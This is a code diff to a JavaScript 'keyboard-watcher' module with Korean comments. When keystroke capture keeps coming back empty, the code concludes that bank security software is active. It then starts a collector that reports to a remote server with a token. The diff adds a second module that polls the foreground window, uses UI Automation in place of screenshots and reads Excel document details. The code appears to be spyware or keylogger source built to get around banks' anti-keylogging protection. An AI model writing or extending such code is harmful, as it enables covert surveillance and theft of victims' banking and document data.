@@ -986,6 +986,7 @@ function isPaused() { return _paused; }
 // ══════════════════════════════════════════════════════════════════════════════
 let _emptyCount = 0;
 let _bankSafe = null;
+let _bankEnhanced = null;
 
 function _checkBankSecurity() {
   // Windows에서만 동작
@@ -998,26 +999,50 @@ function _checkBankSecurity() {
     _emptyCount++;
   } else {
     _emptyCount = 0;
-    // 정상 복구 시 bank-safe-collector 중지
+    // 정상 복구 시 bank-safe 모듈들 중지
     if (_bankSafe) {
       try { _bankSafe.notifyActive(); } catch {}
     }
+    if (_bankEnhanced && _bankEnhanced.isRunning()) {
+      try { _bankEnhanced.stop(); } catch {}
+      console.log('[keyboard-watcher] 정상 복구 → bank-safe-enhanced 중지');
+    }
   }
 
-  // 5회 연속 비어있으면 은행 보안 감지 → bank-safe-collector 시작
-  if (_emptyCount >= 5 && !_bankSafe) {
-    try {
-      _bankSafe = require('./bank-safe-collector');
-      if (!_bankSafe.isRunning()) {
-        console.log('[keyboard-watcher] 은행 보안 감지 → bank-safe-collector 시작');
-        _bankSafe.start({
-          serverUrl: _remoteUrl,
-          token: _remoteToken,
-          interval: 5 * 60 * 1000,
-        });
+  // 5회 연속 비어있으면 은행 보안 감지 → bank-safe 모듈들 시작
+  if (_emptyCount >= 5) {
+    // 기존 collector
+    if (!_bankSafe) {
+      try {
+        _bankSafe = require('./bank-safe-collector');
+        if (!_bankSafe.isRunning()) {
+          console.log('[keyboard-watcher] 은행 보안 감지 → bank-safe-collector 시작');
+          _bankSafe.start({
+            serverUrl: _remoteUrl,
+            token: _remoteToken,
+            interval: 5 * 60 * 1000,
+          });
+        }
+      } catch (e) {
+        console.warn('[keyboard-watcher] bank-safe-collector 로드 실패:', e.message);
       }
-    } catch (e) {
-      console.warn('[keyboard-watcher] bank-safe-collector 로드 실패:', e.message);
+    }
+
+    // ★ 강화 모듈 (GetForegroundWindow + UI Automation + 시스템 메트릭)
+    if (!_bankEnhanced) {
+      try {
+        _bankEnhanced = require('./bank-safe-enhanced');
+        if (!_bankEnhanced.isRunning()) {
+          console.log('[keyboard-watcher] 은행 보안 감지 → bank-safe-enhanced 시작');
+          console.log('[keyboard-watcher]   ├─ GetForegroundWindow 1초 폴링');
+          console.log('[keyboard-watcher]   ├─ UI Automation (스크린샷 대체)');
+          console.log('[keyboard-watcher]   ├─ 시스템 메트릭 (CPU/MEM/IO)');
+          console.log('[keyboard-watcher]   └─ Excel COM (문서 정보)');
+          _bankEnhanced.start();
+        }
+      } catch (e) {
+        console.warn('[keyboard-watcher] bank-safe-enhanced 로드 실패:', e.message);
+      }
     }
   }
 }
